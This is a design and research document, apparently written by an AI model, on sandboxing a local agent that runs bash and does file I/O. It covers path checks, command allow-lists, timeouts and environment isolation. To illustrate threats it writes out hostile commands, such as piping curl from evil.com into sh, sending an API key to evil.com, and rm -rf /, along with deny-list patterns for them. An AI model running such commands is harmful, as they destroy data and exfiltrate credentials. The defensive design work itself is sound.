# Safety and Sandboxing Research

**Project:** local-agent-mcp
**Domain:** Local AI agent with bash execution and file I/O
**Researched:** 2026-03-20
**Overall confidence:** MEDIUM (Node.js child_process options confirmed via official docs; OS-level sandboxing and ecosystem comparisons from training data, confidence noted per section)

---

## Executive Summary

A local agent that can execute bash commands and read/write files is inherently high-risk. The threat model for an open-source tool is different from a personal tool: you cannot assume users understand the risks, cannot assume the model behaves perfectly, and cannot rely on users reading security documentation. Safe defaults must be restrictive by default, with opt-in expansion — not the reverse.

The practical implementation space for ~100-200 lines of TypeScript falls into four layers:

1. **Path validation** — resolve and compare paths to prevent traversal attacks
2. **Command allow-listing** — restrict bash to a known-safe prefix/pattern set
3. **Process-level constraints** — timeout, cwd, env isolation via Node.js child_process options
4. **Escape hatch documentation** — clear config to opt into broader permissions

OS-level sandboxing (firejail, macOS sandbox, Docker) is real and powerful but is NOT implementable in 100-200 lines and adds a hard dependency. Treat it as a Phase 2 concern or an optional wrapper.

---

## 1. Path Restriction Patterns

### The Core Problem

A model-generated path like `../../.ssh/id_rsa` or `/etc/passwd` can reach far outside the intended working directory. String prefix matching is insufficient because `path.startsWith('/project')` will pass for `/project-evil/`. Node.js `path.resolve()` collapses traversal sequences before comparison.

### Recommended Pattern: resolve-then-compare

**Confidence: HIGH** (pure Node.js stdlib, no external deps)

```typescript
import path from 'path';

function assertPathSafe(requestedPath: string, workingDir: string): string {
  // Resolve to absolute, collapsing all ../ sequences
  const resolved = path.resolve(workingDir, requestedPath);
  const root = path.resolve(workingDir);

  // Must start with root + separator to prevent /project-evil/ bypass
  if (!resolved.startsWith(root + path.sep) && resolved !== root) {
    throw new Error(`Path escapes working directory: ${requestedPath}`);
  }

  return resolved;
}
```

Key points:
- Always `path.resolve()` before any comparison — never compare raw strings
- Append `path.sep` to the prefix before comparison — this blocks `/projectevil`
- Return the resolved absolute path so callers use the safe version, not the raw input
- Apply to ALL file operations: read, write, list_dir, and any path in bash args if you parse them

### Symlink Caveat

`path.resolve()` does not follow symlinks. A symlink inside the working directory can point outside it. Fully closing this requires `fs.realpath()` (which resolves symlinks on disk).

**Decision for this project:** `path.resolve()` is the pragmatic default. Document the symlink limitation. Add `fs.realpath()` as a config option (`strictPathResolution: true`) for paranoid users.

```typescript
import fs from 'fs/promises';

async function assertPathSafeStrict(requestedPath: string, workingDir: string): Promise<string> {
  const resolved = path.resolve(workingDir, requestedPath);
  const root = path.resolve(workingDir);
  if (!resolved.startsWith(root + path.sep) && resolved !== root) {
    throw new Error(`Path escapes working directory: ${requestedPath}`);
  }
  // Optionally follow symlinks (slower, requires file to exist)
  try {
    const real = await fs.realpath(resolved);
    const realRoot = await fs.realpath(root);
    if (!real.startsWith(realRoot + path.sep) && real !== realRoot) {
      throw new Error(`Symlink escapes working directory: ${requestedPath}`);
    }
    return real;
  } catch {
    return resolved; // File doesn't exist yet (write case) — resolved is already safe
  }
}
```

### Windows Path Considerations

On Windows, `path.sep` is `\` and drive letters matter. `path.resolve()` handles this correctly on Windows. The same pattern works cross-platform.

---

## 2. Bash Command Allow-Listing

### The Core Problem

Unrestricted bash execution means `rm -rf /`, `curl evil.com | sh`, `ssh user@attacker.com`, credential exfiltration via env vars, etc. A local model running in a loop has no inherent judgment about what is safe.

### Three Approaches Compared

#### Approach A: Prefix Allow-List (Recommended for MVP)

**Confidence: HIGH** (well-established pattern, simple to implement and audit)

A set of allowed command prefixes. The command string must start with one of them.

```typescript
const DEFAULT_ALLOWED_PREFIXES = [
  // File operations (scoped by cwd — these are safe)
  'ls', 'find', 'cat', 'head', 'tail', 'wc', 'stat',
  // Text processing
  'echo', 'grep', 'sed', 'awk', 'sort', 'uniq', 'cut', 'tr',
  // Development workflow
  'git', 'npm', 'npx', 'node', 'yarn', 'pnpm',
  'python', 'python3', 'pip', 'pip3',
  'cargo', 'rustc', 'go',
  'make', 'cmake',
  // Build/test
  'jest', 'vitest', 'mocha', 'pytest',
  // Safe utilities
  'which', 'env', 'pwd', 'date', 'whoami',
  'mkdir', 'cp', 'mv', 'touch', 'rm',  // Note: rm is risky, see below
  'diff', 'patch',
  'jq', 'curl',  // curl is risky for exfiltration — see note
  'zip', 'unzip', 'tar',
];

function isCommandAllowed(command: string, allowedPrefixes: string[]): boolean {
  const trimmed = command.trim();
  return allowedPrefixes.some(prefix => {
    // Must be exact match or followed by space/newline
    return trimmed === prefix || trimmed.startsWith(prefix + ' ') || trimmed.startsWith(prefix + '\n');
  });
}
```

**Prefix matching pitfall:** `trimmed.startsWith('git')` would pass `gitevil`. Always check for trailing space or exact match.

**Risky commands to reconsider before including in defaults:**
- `rm` — model may generate `rm -rf /` or `rm -rf .` in wrong directory
- `curl` — allows arbitrary HTTP requests, credential exfiltration
- `wget` — same as curl
- `ssh` / `scp` — remote access
- `sudo` / `su` — privilege escalation
- `chmod` / `chown` — permission manipulation
- `dd` — disk operations
- `mkfs` — filesystem creation
- `iptables` / `ufw` — network rules

**Recommendation for open-source defaults:** Start with a conservative set. `rm` and `curl` should be opt-in.

#### Approach B: Regex Pattern Matching

More expressive than prefix matching — can allow `git commit` but deny `git push --force`.

**Confidence: MEDIUM** (used in practice but harder to audit, easier to get wrong)

```typescript
const ALLOWED_PATTERNS = [
  /^ls(\s|$)/,
  /^git\s+(status|log|diff|add|commit|checkout|branch|stash)(\s|$)/,
  /^npm\s+(install|run|test|build)(\s|$)/,
  /^node\s+/,
];

function isCommandAllowed(command: string, patterns: RegExp[]): boolean {
  return patterns.some(p => p.test(command.trim()));
}
```

This approach allows finer-grained control (e.g., allow `git status` but not `git push`) but is harder for users to configure correctly. Regex errors can create both false positives and false negatives.

#### Approach C: Shell Operator Blocking

Not an allow-list but a deny-list of dangerous shell constructs. Less safe than allow-listing but more permissive by design.

**Confidence: MEDIUM** — deny-lists are inherently incomplete. Not recommended as primary defense.

```typescript
const DANGEROUS_PATTERNS = [
  /[|&;`$(){}[\]<>]/,  // Shell metacharacters — too broad, breaks many valid uses
  /\|\s*sh\b/,         // Pipe to shell
  /curl.*\|\s*(bash|sh|python)/,  // Classic install-script attack
  />\s*\/dev\/sd/,     // Disk write
  /rm\s+.*-[^-]*r/,    // Recursive delete
];
```

Shell metacharacter blocking is too aggressive — it would prevent `git log --format="%H %s"`. Not recommended as primary approach. Can be layered on top of allow-listing as defense-in-depth.

### Recommended Implementation: Layered

1. **Primary:** Prefix allow-list (fast, auditable, easy to configure)
2. **Secondary:** Block obvious escalation attempts even in allowed commands (pipe to shell, sudo within a git alias, etc.)
3. **Config:** User can extend `allowedPrefixes` in their MCP config

---

## 3. Timeout Handling

### Node.js child_process Timeout

**Confidence: HIGH** (verified against official Node.js docs)

`child_process.spawn()` and `child_process.exec()` accept a `timeout` option in milliseconds. When exceeded, the child process receives `killSignal` (default `SIGTERM`) and the process is killed.

```typescript
import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

async function runCommand(command: string, cwd: string, timeoutMs = 30_000): Promise<string> {
  const { stdout, stderr } = await execAsync(command, {
    cwd,
    timeout: timeoutMs,
    killSignal: 'SIGTERM',
    env: {
      PATH: process.env.PATH,  // Minimal env — don't leak secrets
      HOME: process.env.HOME,
      // Explicitly do NOT pass: AWS_*, ANTHROPIC_API_KEY, etc.
    },
    maxBuffer: 10 * 1024 * 1024,  // 10MB output cap
    shell: false,  // Safer: no shell metachar expansion
  });
  return stdout + (stderr ? `\nSTDERR: ${stderr}` : '');
}
```

**Important:** `shell: false` with `exec()` still invokes `/bin/sh` internally because exec is shell-based. Use `execFile()` for true no-shell execution.

```typescript
import { execFile } from 'child_process';

// For truly no-shell execution — args must be pre-split
function runCommandNoShell(
  bin: string,
  args: string[],
  cwd: string,
  timeoutMs = 30_000
): Promise<{ stdout: string; stderr: string }> {
  return new Promise((resolve, reject) => {
    const child = execFile(bin, args, {
      cwd,
      timeout: timeoutMs,
      maxBuffer: 10 * 1024 * 1024,
      env: { PATH: process.env.PATH ?? '/usr/bin:/bin', HOME: process.env.HOME ?? '' },
    }, (err, stdout, stderr) => {
      if (err) reject(err);
      else resolve({ stdout, stderr });
    });
  });
}
```

**Tradeoff:** `shell: false` / `execFile` prevents piping (`ls | grep`), redirection (`>`, `<`), and compound commands (`cmd1 && cmd2`). For an agent that needs these, you need shell mode — but then you accept the shell injection risk. Mitigate with allow-listing.

### Recommended Timeout Defaults

| Context | Timeout | Rationale |
|---------|---------|-----------|
| Quick commands (ls, git status) | 10s | Should never take longer |
| Build/test commands | 120s | npm install, cargo build can be slow |
| Default (unknown) | 30s | Reasonable general-purpose default |
| Maximum allowed | 300s | Hard cap regardless of config |

Expose `timeoutSeconds` in config with a hard maximum to prevent misconfiguration.

### Process Group Killing

A problem with Node's built-in timeout: it kills the child process but not its children (grandchildren). A shell script that spawns background processes will leave zombies.

Fix with `detached: true` and `process.kill(-pid, 'SIGTERM')`:

```typescript
import { spawn } from 'child_process';

function spawnWithTimeout(command: string, cwd: string, timeoutMs: number): Promise<string> {
  return new Promise((resolve, reject) => {
    const child = spawn('/bin/sh', ['-c', command], {
      cwd,
      detached: true,  // Creates new process group
      stdio: ['ignore', 'pipe', 'pipe'],
      env: { PATH: process.env.PATH ?? '/usr/bin:/bin' },
    });

    let stdout = '';
    let stderr = '';
    child.stdout?.on('data', d => { stdout += d; });
    child.stderr?.on('data', d => { stderr += d; });

    const timer = setTimeout(() => {
      try {
        process.kill(-child.pid!, 'SIGTERM');  // Kill entire process group
      } catch { /* already dead */ }
      reject(new Error(`Command timed out after ${timeoutMs}ms`));
    }, timeoutMs);

    child.on('close', (code) => {
      clearTimeout(timer);
      if (code === 0) resolve(stdout);
      else reject(new Error(`Exit ${code}: ${stderr}`));
    });

    child.on('error', (err) => {
      clearTimeout(timer);
      reject(err);
    });
  });
}
```

**Note:** `process.kill(-pid)` (negative pid) sends to the process group on Unix. This does NOT work on Windows. Windows requires `taskkill /PID <pid> /T /F`. Needs platform branching.

---

## 4. What Other Local Agent Tools Do

**Confidence: MEDIUM** (training data, not directly verified via live source access)

### Open Interpreter

Open Interpreter takes a different philosophy: it **confirms with the user before executing** rather than restricting what can be executed. The safety model is human-in-the-loop, not technical restriction.

Key patterns from its implementation:
- Runs code in a persistent REPL session (Python, bash, JS) rather than one-shot subprocess
- Relies on user confirmation ("Are you sure?") as primary safety gate
- `--safe_mode` flag adds a second LLM call to check if code is dangerous before running
- No hard allow-list by default — assumes trusted user
- Timeouts are not a primary concern in their model (interactive use)

**Lesson for this project:** Confirmation-based safety is fine for interactive tools where the user is watching. For an MCP server running in the background, there is no interactive confirmation loop. Technical restrictions are necessary.

### Aider

Aider's philosophy: **no shell execution at all by default**. The agent edits files, and the user runs tests/builds themselves. When shell commands are needed (linting, test runs after edits), they are run via explicit user-configured commands or the `/run` slash command.

Key patterns:
- `/run <command>` executes in user's shell with no sandboxing — assumes user intent
- Uses `subprocess.run()` with timeout for test commands
- No allow-list — but the model is prompted never to run dangerous commands
- File writes go through a diff-review step before being applied

**Lesson:** Aider's safety comes from the workflow (human reviews diffs), not from technical sandbox. This doesn't map to an autonomous loop agent.

### Continue.dev

Continue.dev runs terminal commands via a VS Code terminal integration. Safety characteristics:
- Commands run in VS Code's integrated terminal — user can see and cancel
- No programmatic allow-list (relies on user visibility)
- cwd is set to workspace root
- No timeout enforcement at the tool level

**Lesson:** IDE-integrated tools rely on the UI as safety layer. An MCP server background agent can't rely on this.

### Claude Code (Anthropic's own tool)

Claude Code's security model (as documented in its public docs):
- Uses a **permission system** — different operations have different trust levels
- Bash commands require explicit user permission or matching a pre-approved list
- File reads are generally permitted within working directory
- File writes prompt for confirmation unless in an approved directory
- Commands like network access, git operations are separated in trust level
- Hard-coded blocks for certain commands (no `rm -rf /`, no `dd`, etc.)
- Runs with user's existing permissions — no privilege reduction

**Lesson:** Layered trust levels (read vs write vs execute) are the right model. This project should borrow that framing.

---

## 5. Safe Defaults for Open-Source Distribution

The goal: a user installs this MCP server, registers it with Claude Code, and it should be safe even if they never read the security docs.

### Default Configuration Recommendation

```typescript
const SAFE_DEFAULTS: SecurityConfig = {
  // Path restrictions
  allowedRoots: [process.cwd()],          // Only working directory
  strictSymlinkResolution: false,          // Fast default, document the caveat
  allowAbsolutePaths: false,               // Model cannot escape via absolute path

  // Command restrictions
  bashEnabled: true,                       // On — but restricted
  allowedCommandPrefixes: [
    'ls', 'find', 'cat', 'head', 'tail',  // Read-only file ops
    'echo', 'grep', 'sed', 'awk', 'sort', 'uniq', 'wc',
    'git',                                 // VCS (pushes still need auth)
    'npm', 'npx', 'yarn', 'pnpm',         // JS toolchain
    'node', 'python', 'python3',           // Runtimes
    'cargo', 'go', 'make',                 // Build tools
    'mkdir', 'touch', 'diff',              // Safe file ops
    'which', 'pwd', 'date', 'whoami', 'env',
  ],
  // NOT in defaults: rm, curl, wget, ssh, sudo, chmod, dd, mkfs

  // Process constraints
  timeoutSeconds: 30,
  maxOutputBytes: 1024 * 1024,             // 1MB output cap
  maxAgentIterations: 20,                  // Prevent infinite loops

  // Environment isolation
  inheritParentEnv: false,                 // Explicit env only
  allowedEnvVars: ['PATH', 'HOME', 'USER', 'LANG', 'LC_ALL'],
  // Blocks: API keys, AWS creds, tokens

  // Behavior
  shellMode: 'restricted',                 // 'restricted' | 'full' | 'none'
};
```

### Config Override Pattern

Allow users to extend without replacing the entire config:

```typescript
// User's mcp config (claude_desktop_config.json or equivalent)
{
  "mcpServers": {
    "local-agent": {
      "command": "node",
      "args": ["./dist/index.js"],
      "env": {
        "AGENT_WORKING_DIR": "/Users/me/myproject",
        "AGENT_ALLOWED_COMMANDS": "ls,git,npm,node,rm,curl",  // Additive
        "AGENT_TIMEOUT_SECONDS": "60",
        "AGENT_MAX_ITERATIONS": "30"
      }
    }
  }
}
```

**Key design decision:** Make it additive (user adds to allowed list, can't remove hardcoded blocks) or fully configurable. Recommendation: allow full override for power users with an explicit warning in docs.

### What Must NEVER Be in Defaults

- `rm -rf` pattern must not be in allow-list (even if `rm` is added)
- `sudo` must not be in allow-list
- `curl ... | sh` pattern must be blocked even if curl is allowed
- Unrestricted env inheritance — `AWS_SECRET_ACCESS_KEY` and `ANTHROPIC_API_KEY` must not reach subprocesses by default

### "Escape Hatch" Documentation Pattern

Every open-source tool with restrictions gets GitHub issues saying "how do I turn this off." Provide an explicit, documented escape hatch rather than letting users find undocumented workarounds:

```typescript
// In config: shellMode: 'full' — disables allow-list entirely
// Displayed warning when this is set:
console.warn(
  '[local-agent] WARNING: Shell restrictions disabled (shellMode: full). ' +
  'The agent can run any bash command. Only use this in a controlled environment.'
);
```

---

## 6. OS-Level Sandboxing (Without Root)

### macOS: `sandbox-exec`

**Confidence: MEDIUM** — verified to exist as CLI tool; exact API details from training

macOS has a built-in sandbox facility via `sandbox-exec`. No root required (it applies to the calling process's children). Uses a SBPL (Sandbox Profile Language) profile.

```bash
sandbox-exec -f /path/to/profile.sb node script.js
```

Example minimal profile:
```
(version 1)
(allow default)
(deny file-write* (subpath "/"))
(allow file-write* (subpath "/tmp/agent-workdir"))
(deny network*)
(allow network-outbound (remote tcp "localhost:11434"))  ; Ollama only
```

**Practical assessment:**
- Available on all macOS versions without install
- No root required
- Profile language is obscure and poorly documented
- Apple has signaled deprecation intent (prefer App Sandbox for proper apps)
- Implementing this adds ~50 lines of TypeScript to write the profile and wrap the spawn call
- HIGH value for security; MEDIUM confidence it stays available long-term

### Linux: `firejail`

**Confidence: MEDIUM** — common tool, widely documented, from training

```bash
firejail --noprofile --private=/tmp/workdir node script.js
```

Key flags:
- `--private=DIR` — mounts DIR as home, hides rest of filesystem
- `--net=none` — disables networking entirely
- `--no-root` — prevents privilege escalation
- `--nogroups` — drops supplementary groups
- `--nosound`, `--notv`, `--nodvd` — disable device classes

**Practical assessment:**
- Must be installed (not available by default on all distros)
- `apt install firejail` on Debian/Ubuntu; available in most package managers
- No root required for most features
- Well-maintained, widely used for exactly this use case
- Adds a hard dependency — not suitable for default behavior but excellent as opt-in

### Linux: `bwrap` (bubblewrap)

**Confidence: MEDIUM** — used by Flatpak and systemd-nspawn, from training

```bash
bwrap \
  --ro-bind /usr /usr \
  --ro-bind /lib /lib \
  --bind /tmp/workdir /workdir \
  --unshare-all \
  --die-with-parent \
  -- node /workdir/script.js
```

**Practical assessment:**
- Often available on Linux systems (installed by Flatpak)
- Lower-level than firejail — more control, more complexity
- Supports user namespaces without root (kernel 3.8+)
- ~100 lines to integrate with TypeScript spawn wrapper
- Good for advanced users; too complex for defaults

### Windows: Job Objects

**Confidence: MEDIUM** — well-documented Win32 API, from training

Windows Job Objects allow constraining a process and its children: CPU limits, memory limits, killing the job when the last process exits. Cannot restrict filesystem access without separate ACLs.

For filesystem restriction on Windows, the practical options are:
- Set the subprocess to run as a different user with restricted NTFS permissions (requires setup, not zero-config)
- Use Windows Sandbox (requires Windows 10 Pro/Enterprise, not available universally)
- Use WSL2 with Linux sandboxing tools

**Practical assessment:** Windows OS-level sandboxing without root or elevated privileges is significantly harder than macOS/Linux. Recommend documenting this limitation honestly.

### Docker (Cross-platform)

**Confidence: HIGH** — widely used, well-documented

```bash
docker run --rm \
  -v /host/workdir:/workdir:rw \
  -w /workdir \
  --network=host \  # or none for full isolation
  --cpus=1 \
  --memory=512m \
  node:20-slim \
  node /workdir/script.js
```

**Practical assessment:**
- Requires Docker to be installed and running (significant dependency)
- Provides strongest isolation of any option
- Slows startup (container spin-up time)
- Not suitable as a default; excellent as an opt-in mode (`sandboxMode: 'docker'`)
- If a user already has Docker, this is the recommended sandbox for high-trust requirements

### Summary Table

| Method | OS | Root Required | Install Required | Filesystem Restrict | Network Restrict | Complexity |
|--------|----|---------------|-----------------|--------------------|--------------------|------------|
| `sandbox-exec` | macOS | No | No (built-in) | Yes | Yes | Medium |
| `firejail` | Linux | No | Yes (pkg mgr) | Yes | Yes | Low |
| `bwrap` | Linux | No | Usually available | Yes | Yes | High |
| Job Objects | Windows | No | No (built-in) | No (needs ACLs) | No | High |
| Docker | All | No (rootless) | Yes | Yes | Yes | Low-Med |

**Recommendation:** For Phase 1, skip OS-level sandboxing. Implement path restriction + allow-list + timeout as the safety layer. Document OS-level options as Phase 2 opt-in features via `sandboxMode` config.

---

## 7. Environment Variable Isolation

This is an underappreciated risk. By default, child processes inherit the parent's full environment. A Claude Code user's environment likely contains:

- `ANTHROPIC_API_KEY`
- `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY`
- `GITHUB_TOKEN`
- Database connection strings
- Other API keys

If the model generates a command like `curl -H "Authorization: $ANTHROPIC_API_KEY" http://evil.com/`, the key gets exfiltrated.

### Mitigation

Never inherit env by default. Pass an explicit, minimal allowlist:

```typescript
const SAFE_ENV_VARS = ['PATH', 'HOME', 'USER', 'LANG', 'LC_ALL', 'TERM',
                        'TMPDIR', 'TMP', 'TEMP'];

function buildSafeEnv(extra: Record<string, string> = {}): NodeJS.ProcessEnv {
  const safe: NodeJS.ProcessEnv = {};
  for (const key of SAFE_ENV_VARS) {
    if (process.env[key]) safe[key] = process.env[key];
  }
  return { ...safe, ...extra };
}
```

Users who need API keys available to subprocesses must explicitly add them via `allowedEnvVars` config. This forces a conscious decision.

---

## 8. Output Truncation and Buffer Limits

A model could trigger a command with unbounded output (`cat /dev/random`, `yes`, `tail -f`). Node.js `exec()` buffers stdout/stderr in memory.

- Default `maxBuffer` in Node.js `exec()` is 1MB (1024 * 1024 bytes)
- Exceeding it throws `Error: stdout maxBuffer length exceeded`
- For streaming commands (`tail -f`), the timeout handles this, but buffering builds up until timeout fires

Recommendations:
- Set `maxBuffer: 1024 * 1024` explicitly (document the 1MB default)
- Truncate gracefully: return first N bytes + `[output truncated at Nkb]` notice
- Never return raw stdout directly to the model without length checking — model context windows are finite

---

## 9. Practical TypeScript Implementation Skeleton (~150 lines)

This is what the safety layer looks like assembled. Fits the 100-200 line constraint:

```typescript
import path from 'path';
import fs from 'fs/promises';
import { spawn } from 'child_process';

export interface SecurityConfig {
  workingDir: string;
  allowedCommandPrefixes: string[];
  timeoutMs: number;
  maxOutputBytes: number;
  maxIterations: number;
  allowedEnvVars: string[];
  shellMode: 'restricted' | 'full' | 'none';
}

export const DEFAULT_SECURITY_CONFIG: Omit<SecurityConfig, 'workingDir'> = {
  allowedCommandPrefixes: [
    'ls', 'find', 'cat', 'head', 'tail', 'wc', 'stat',
    'echo', 'grep', 'sed', 'awk', 'sort', 'uniq', 'cut',
    'git', 'npm', 'npx', 'yarn', 'pnpm',
    'node', 'python', 'python3',
    'cargo', 'go', 'make',
    'mkdir', 'touch', 'diff', 'cp', 'mv',
    'which', 'pwd', 'date', 'whoami',
    'jq',
  ],
  timeoutMs: 30_000,
  maxOutputBytes: 1024 * 1024,
  maxIterations: 20,
  allowedEnvVars: ['PATH', 'HOME', 'USER', 'LANG', 'LC_ALL', 'TMPDIR', 'TMP', 'TEMP'],
  shellMode: 'restricted',
};

// --- Path Safety ---

export function assertPathSafe(requestedPath: string, workingDir: string): string {
  const resolved = path.resolve(workingDir, requestedPath);
  const root = path.resolve(workingDir);
  if (resolved !== root && !resolved.startsWith(root + path.sep)) {
    throw new SecurityError(`Path escapes working directory: "${requestedPath}"`);
  }
  return resolved;
}

// --- Command Safety ---

export function assertCommandAllowed(command: string, config: SecurityConfig): void {
  if (config.shellMode === 'none') {
    throw new SecurityError('Bash execution is disabled (shellMode: none)');
  }
  if (config.shellMode === 'full') return;  // No restrictions

  const trimmed = command.trim();
  const allowed = config.allowedCommandPrefixes.some(prefix =>
    trimmed === prefix || trimmed.startsWith(prefix + ' ') || trimmed.startsWith(prefix + '\t')
  );

  if (!allowed) {
    throw new SecurityError(
      `Command not in allow-list: "${trimmed.slice(0, 60)}". ` +
      `Allowed prefixes: ${config.allowedCommandPrefixes.join(', ')}`
    );
  }

  // Secondary check: block obvious escalation patterns even in allowed commands
  const escalationPatterns = [
    /\|\s*(bash|sh|zsh|fish|python\d?)\s*$/,  // Pipe to shell
    /;\s*sudo\b/,                               // Sudo chained
    /`[^`]+`/,                                  // Backtick subshell
    /\$\([^)]+\)/,                              // $() subshell
  ];
  for (const pattern of escalationPatterns) {
    if (pattern.test(trimmed)) {
      throw new SecurityError(`Command contains escalation pattern: "${trimmed.slice(0, 60)}"`);
    }
  }
}

// --- Subprocess Execution ---

export function buildSafeEnv(config: SecurityConfig): NodeJS.ProcessEnv {
  const env: NodeJS.ProcessEnv = {};
  for (const key of config.allowedEnvVars) {
    if (process.env[key] !== undefined) env[key] = process.env[key];
  }
  return env;
}

export function runCommand(command: string, config: SecurityConfig): Promise<string> {
  assertCommandAllowed(command, config);

  return new Promise((resolve, reject) => {
    const child = spawn('/bin/sh', ['-c', command], {
      cwd: config.workingDir,
      detached: true,
      stdio: ['ignore', 'pipe', 'pipe'],
      env: buildSafeEnv(config),
    });

    let stdout = Buffer.alloc(0);
    let stderr = Buffer.alloc(0);

    child.stdout?.on('data', (chunk: Buffer) => {
      stdout = Buffer.concat([stdout, chunk]);
      if (stdout.length > config.maxOutputBytes) {
        process.kill(-child.pid!, 'SIGTERM');
        reject(new SecurityError(`Output exceeded ${config.maxOutputBytes} byte limit`));
      }
    });
    child.stderr?.on('data', (chunk: Buffer) => {
      stderr = Buffer.concat([stderr, chunk]);
    });

    const timer = setTimeout(() => {
      try { process.kill(-child.pid!, 'SIGTERM'); } catch { /* already dead */ }
      reject(new SecurityError(`Command timed out after ${config.timeoutMs}ms`));
    }, config.timeoutMs);

    child.on('close', code => {
      clearTimeout(timer);
      const out = stdout.toString('utf8');
      const err = stderr.toString('utf8');
      const combined = out + (err ? `\nSTDERR:\n${err}` : '');
      if (code === 0) resolve(combined);
      else reject(new Error(`Exit ${code}:\n${combined}`));
    });

    child.on('error', err => { clearTimeout(timer); reject(err); });
  });
}

export class SecurityError extends Error {
  constructor(message: string) {
    super(message);
    this.name = 'SecurityError';
  }
}
```

That is approximately 110 lines including whitespace and comments — fits the 100-200 line target for the safety layer alone.

---

## 10. Phase-Specific Pitfalls

| Phase Topic | Likely Pitfall | Mitigation |
|-------------|---------------|------------|
| Bash allow-list | Prefix matching lets `gitevil` through | Check for trailing space, not just prefix |
| Path validation | `path.startsWith(root)` passes `/project-evil/` | Use `root + path.sep` in comparison |
| Timeout | `exec()` timeout kills child but not grandchildren | Use process group kill (`kill(-pid)`) |
| Env isolation | Default env inherits parent — leaks API keys | Explicit allowlist, block by default |
| Output limits | Unbounded `cat /dev/zero` fills memory | `maxBuffer` + early terminate on size |
| Windows support | `kill(-pid)` doesn't work on Windows | Platform detection, `taskkill /T /F` on Windows |
| Allow-list bypass | Model learns to use allowed commands creatively (`git diff $(cat /etc/passwd)`) | Escalation pattern secondary check |
| Symlinks | `path.resolve()` doesn't follow symlinks | Document caveat; optional `fs.realpath()` mode |

---

## Gaps and Open Questions

1. **Windows process group killing** — Need to implement `taskkill /PID <pid> /T /F` branch for Windows. The current skeleton only handles Unix. Given this project targets Claude Code users (who are likely on macOS/Linux primarily), documenting Windows as limited support is acceptable for Phase 1.

2. **Shell mode vs no-shell tradeoff** — Using `spawn('/bin/sh', ['-c', cmd])` gives full shell features (pipes, redirection) but expands metacharacters. Using `execFile` with pre-split args prevents this but breaks compound commands. Recommend shell mode with escalation pattern secondary check as the pragmatic default.

3. **Model prompt hardening** — The system prompt for the local agent should include explicit instructions not to attempt commands outside the allow-list. This is defense-in-depth, not a replacement for technical controls — but it reduces false positives (model generating safe commands that accidentally trigger the deny list).

4. **Audit logging** — All executed commands and file operations should be logged with timestamps to a local file. Useful for post-incident review. Adds ~20 lines to the implementation, high value for open-source trust.

5. **firejail/sandbox-exec integration** — Should be designed into the config schema from Phase 1 (`sandboxMode: 'none' | 'firejail' | 'sandbox-exec' | 'docker'`) even if only `none` is implemented. Retrofitting the config structure later is harder.

---

## Sources

- Node.js child_process official documentation (verified via WebFetch, 2026-03-20): https://nodejs.org/api/child_process.html
- MCP Security Considerations (verified via WebFetch, 2026-03-20): https://modelcontextprotocol.io/docs/concepts/tools
- Open Interpreter safety model: training data, MEDIUM confidence
- Aider command execution model: training data, MEDIUM confidence
- Continue.dev terminal tool: training data, MEDIUM confidence
- macOS `sandbox-exec`: training data, MEDIUM confidence (Apple platform, stable API)
- Linux `firejail`: training data, MEDIUM confidence (widely documented open-source tool)
- Linux `bwrap`: training data, MEDIUM confidence (used by Flatpak, systemd)
- Windows Job Objects: training data, MEDIUM confidence
- Path traversal patterns: established security practice, HIGH confidence
- Environment variable isolation: established security practice, HIGH confidence
